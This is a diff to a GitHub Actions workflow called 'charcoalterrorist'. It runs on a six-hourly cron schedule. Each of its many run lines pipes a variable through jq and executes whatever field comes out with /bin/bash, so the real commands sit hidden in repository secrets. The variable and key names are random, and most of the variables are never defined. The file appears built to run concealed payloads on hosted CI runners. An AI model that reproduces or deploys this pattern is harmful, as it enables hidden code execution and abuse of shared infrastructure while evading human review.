@@ -2,8 +2,9 @@ name: charcoalterrorist
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 4/6 * * *'
-jobs:  # 3468
+    - cron: '58 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +12,19 @@ jobs:  # 3468
       - uses: actions/checkout@v4
       - name: charcoalterrorist
         env:
-          p8: ${{ secrets.p8 }}
+          pyzd6584: ${{ secrets.pyzd6584 }}
         run: |
-          echo $p8 | jq -r .emvnk33 | /bin/bash
-          echo $wpvlf57 | jq -r .mh1 | /bin/bash
-          echo $uavi2 | jq -r .x5341 | /bin/bash
-          echo $cmq34684 | jq -r .zcprt3269 | /bin/bash
-          echo $v0785 | jq -r .af52 | /bin/bash
-          echo $juget15316 | jq -r .wrgoc51382 | /bin/bash
-          echo $lrd56031 | jq -r .vck0152 | /bin/bash
+          echo $pyzd6584 | jq -r .ydfm9490 | /bin/bash
+          echo $u80 | jq -r .hjuvc3204 | /bin/bash
+          echo $z192 | jq -r .t0564 | /bin/bash
+          echo $tlsl2973 | jq -r .g5 | /bin/bash
+          echo $t9 | jq -r .bn09 | /bin/bash
+          echo $cl40 | jq -r .yndd44 | /bin/bash
+          echo $ibj5125 | jq -r .avhq94 | /bin/bash
+          echo $nps482 | jq -r .suyuz6904 | /bin/bash
+          echo $s858 | jq -r .pebag3 | /bin/bash
+          echo $styo1 | jq -r .cewtf93 | /bin/bash
+          echo $djzkp4 | jq -r .ine66275 | /bin/bash
+          echo $gput491 | jq -r .c9800 | /bin/bash
+          echo $a8 | jq -r .nd142 | /bin/bash
 
